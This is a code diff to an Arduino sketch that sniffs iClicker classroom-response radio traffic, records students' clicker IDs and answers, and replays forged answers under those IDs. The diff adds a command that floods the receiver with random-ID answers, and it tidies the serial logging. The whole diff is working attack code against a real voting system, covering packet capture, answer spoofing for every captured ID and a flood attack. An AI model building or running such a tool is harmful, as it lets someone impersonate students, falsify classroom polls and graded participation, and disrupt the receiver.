@@ -27,13 +27,13 @@ void setup()
   // enter promiscouse mode on sending channel
   clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
   delay(1000);
-  Serial.println("Starting...");
+  Serial.println("Ready!\nr: Reset Capture\na-e: Submit\nf: Random id answers\nu: Uniform submit\np: Print");
 }
 
 
 void loop()
 {
-  char tmp[50];
+  char tmp[100];
   iClickerPacket_t r;
 
   static iClickerAnswerPacket_t old = {{0, 0,0, 0}, ANSWER_A};
@@ -44,11 +44,11 @@ void loop()
   while (recvBuf.pull(&r) && r.type == PACKET_ANSWER && (memcmp(&r.packet.answerPacket, &old, sizeof(old)) || millis() - old_t > THRESHOLD)) {
     uint8_t *id = r.packet.answerPacket.id;
     char answer = iClickerEmulator::answerChar((iClickerAnswer_t)r.packet.answerPacket.answer);
-    snprintf(tmp, sizeof(tmp), "Captured: %c (%02X, %02X, %02X, %02X) \n", answer, id[0], id[1], id[2], id[3]);
-    Serial.print(tmp);
     old = r.packet.answerPacket;
     old_t = millis();
     updateRef(r.packet.answerPacket);
+    snprintf(tmp, sizeof(tmp), "Captured [%lu]: %c (%02X, %02X, %02X, %02X)", num_recvd, answer, id[0], id[1], id[2], id[3]);
+    Serial.println(tmp);
   }
 
   if (Serial.available())
@@ -65,6 +65,11 @@ void loop()
       case 'a': case 'b': case 'c': case 'd': case 'e':
         clicker.stopPromiscuous();
         corrupt_ans(iClickerEmulator::charAnswer(c));
+        clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
+        break;
+
+      case 'f':
+        ans_randoms();
         clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
         break;
 
@@ -113,48 +118,60 @@ void updateRef(iClickerAnswerPacket_t p)
 
 void corrupt_ans(iClickerAnswer_t a)
 {
-  char tmp[50];
-  clicker.floodAttack(random(RAND_LOW, RAND_HIGH), 1);
+  char tmp[100];
   for (uint32_t i = 0; i < num_recvd; i++)
   {
     char answer = iClickerEmulator::answerChar(a);
     bool ret = clicker.submitAnswer(recvd[i].id, a); // no ack
-    snprintf(tmp, sizeof(tmp), "%s %c for ID: (%02X, %02X, %02X, %02X)\n",
+    snprintf(tmp, sizeof(tmp), "%s %c for ID: (%02X, %02X, %02X, %02X)",
     ret ? "Successfully submitted" : "Failed to submit",answer, recvd[i].id[0], recvd[i].id[1], recvd[i].id[2], recvd[i].id[3]);
     Serial.println(tmp);
     delay(5);
   }
   
+  snprintf(tmp, sizeof(tmp), "SUBMITTED A TOTAL OF %lu\n", num_recvd);
+  Serial.println(tmp);
 }
 
 
 void uniform_ans()
 {
+  char tmp[100];
   for (uint32_t i = 0; i < num_recvd; i++)
   {
-    char tmp[50];
     iClickerAnswer_t answer = clicker.randomAnswer();
     bool ret = clicker.submitAnswer(recvd[i].id, answer); // no ack
-    snprintf(tmp, sizeof(tmp), "%s %c for ID: (%02X, %02X, %02X, %02X)\n",
+    snprintf(tmp, sizeof(tmp), "%s %c for ID: (%02X, %02X, %02X, %02X)",
     ret ? "Successfully submitted" : "Failed to submit", iClickerEmulator::answerChar(answer), recvd[i].id[0], recvd[i].id[1], recvd[i].id[2], recvd[i].id[3]);
     Serial.println(tmp);
     delay(5);
   }
+
+  snprintf(tmp, sizeof(tmp), "SUBMITTED A TOTAL OF %lu\n", num_recvd);
+  Serial.println(tmp);
   
 }
 
 
+void ans_randoms()
+{
+  char tmp[100];
+  int num = random(RAND_LOW, RAND_HIGH);
+  snprintf(tmp, sizeof(tmp), "SUBMITTED %d RANDOM ANS\n", num);
+  clicker.floodAttack(num, 1);
+  Serial.println(tmp);
+}
 
 void printCap()
 {
   Serial.println("********BEGIN DUMP********");
-  char tmp[50];
+  char tmp[100];
   uint16_t res[NUM_ANSWER_CHOICES] = { 0 };
   for (uint32_t i = 0; i < num_recvd; i++)
   {
     res[recvd[i].answer]++;
     char answer = iClickerEmulator::answerChar((iClickerAnswer_t)recvd[i].answer);
-    snprintf(tmp, sizeof(tmp), "Captured: %c (%02X, %02X, %02X, %02X) \n", answer,
+    snprintf(tmp, sizeof(tmp), "Captured[%lu]: %c (%02X, %02X, %02X, %02X)", i, answer,
              recvd[i].id[0], recvd[i].id[1], recvd[i].id[2], recvd[i].id[3]);
     Serial.println(tmp);
   }
